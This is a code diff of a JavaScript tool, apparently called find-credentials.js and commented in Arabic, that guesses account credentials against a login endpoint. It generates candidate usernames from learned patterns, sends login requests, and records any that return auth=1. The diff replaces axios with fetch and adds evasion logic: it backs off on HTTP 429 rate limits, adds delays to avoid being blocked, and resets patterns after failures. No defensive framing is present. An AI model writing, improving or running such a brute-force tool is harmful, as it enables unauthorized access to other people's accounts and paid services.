@@ -1,4 +1,4 @@
-const axios = require('axios');
+// find-credentials.js - نسخة بدون اعتماديات خارجية
 const fs = require('fs');
 const path = require('path');
 
@@ -20,18 +20,19 @@ class SmartNumberGenerator {
     constructor() {
         this.generatedNumbers = new Set();
         this.lastValidPattern = null;
+        this.consecutiveFailures = 0;
     }
 
     // توليد رقم بناءً على أنماط
-    generateSmartNumber(basePattern = null) {
+    generateSmartNumber() {
         let number;
         let attempts = 0;
         
         do {
-            if (basePattern && this.lastValidPattern) {
+            if (this.lastValidPattern && this.consecutiveFailures < 30) {
                 // استخدم النمط الأخير الناجح
                 number = this.generateBasedOnPattern(this.lastValidPattern);
-            } else if (Math.random() < 0.3) {
+            } else if (Math.random() < 0.4) {
                 // استخدام الأنماط الشائعة
                 number = this.generateFromCommonPatterns();
             } else {
@@ -93,21 +94,47 @@ class SmartNumberGenerator {
         }
         return result;
     }
+    
+    recordSuccess(pattern) {
+        this.lastValidPattern = pattern;
+        this.consecutiveFailures = 0;
+    }
+    
+    recordFailure() {
+        this.consecutiveFailures++;
+        if (this.consecutiveFailures >= 50) {
+            this.lastValidPattern = null;
+            this.consecutiveFailures = 0;
+        }
+    }
 }
 
-// محاولة تسجيل الدخول
+// محاولة تسجيل الدخول باستخدام fetch المدمج
 async function tryLogin(username, password) {
     const url = `${CONFIG.baseUrl}?username=${username}&password=${password}`;
     
     try {
-        const response = await axios.get(url, {
-            timeout: 5000,
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+        
+        const response = await fetch(url, {
+            signal: controller.signal,
             headers: {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }
         });
         
-        const data = response.data;
+        clearTimeout(timeoutId);
+        
+        if (!response.ok) {
+            return {
+                success: false,
+                data: null,
+                error: `HTTP ${response.status}`
+            };
+        }
+        
+        const data = await response.json();
         
         if (data.user_info && data.user_info.auth === 1) {
             return {
@@ -123,14 +150,13 @@ async function tryLogin(username, password) {
             data: data
         };
     } catch (error) {
-        if (error.response) {
-            // استجابة بخطأ
+        if (error.name === 'AbortError') {
             return {
                 success: false,
-                data: error.response.data
+                data: null,
+                error: 'Timeout'
             };
         }
-        // خطأ في الشبكة أو انتهاء الوقت
         return {
             success: false,
             data: null,
@@ -166,7 +192,7 @@ async function main() {
     
     let attempts = 0;
     let successfulLogins = [];
-    let consecutiveFailures = 0;
+    let rateLimitCount = 0;
     
     while (Date.now() - startTime < maxTimeMs) {
         attempts++;
@@ -196,8 +222,7 @@ async function main() {
             });
             
             // تحديث النمط الناجح
-            generator.lastValidPattern = username;
-            consecutiveFailures = 0;
+            generator.recordSuccess(username);
             
             // حفظ النتائج فوراً
             saveResults(successfulLogins);
@@ -208,23 +233,28 @@ async function main() {
                 break;
             }
         } else {
-            console.log(`❌ فشل (auth=0)`);
-            consecutiveFailures++;
+            generator.recordFailure();
             
-            // إذا كان هناك 50 فشل متتالي، جرب نمطاً مختلفاً
-            if (consecutiveFailures >= 50) {
-                console.log('🔄 تغيير النمط بعد 50 فشل متتالي...');
-                generator.lastValidPattern = null;
-                consecutiveFailures = 0;
+            if (result.error === 'Timeout') {
+                console.log(`⏱️ انتهاء المهلة`);
+            } else if (result.error && result.error.includes('429')) {
+                rateLimitCount++;
+                console.log(`⚠️ تم تقييد المعدل (429). الانتظار لفترة أطول...`);
+                await new Promise(resolve => setTimeout(resolve, 5000));
+            } else {
+                console.log(`❌ فشل (auth=0)`);
             }
         }
         
         // إضافة تأخير صغير لتجنب الحظر
-        await new Promise(resolve => setTimeout(resolve, 200));
+        const delay = rateLimitCount > 0 ? 1000 : 200;
+        await new Promise(resolve => setTimeout(resolve, delay));
         
-        // عرض التقدم
-        const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
-        console.log(`⏱️  الوقت المنقضي: ${elapsedMinutes} دقيقة | المحاولات: ${attempts}\n`);
+        // عرض التقدم كل 25 محاولة
+        if (attempts % 25 === 0) {
+            const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
+            console.log(`📊 التقدم: ${attempts} محاولة | ${elapsedMinutes} دقيقة | نجاح: ${successfulLogins.length}\n`);
+        }
     }
     
     // النتائج النهائية
@@ -248,6 +278,9 @@ async function main() {
     if (successfulLogins.length > 0) {
         saveResults(successfulLogins);
     }
+    
+    // الخروج بنجاح
+    process.exit(0);
 }
 
 // تشغيل البرنامج
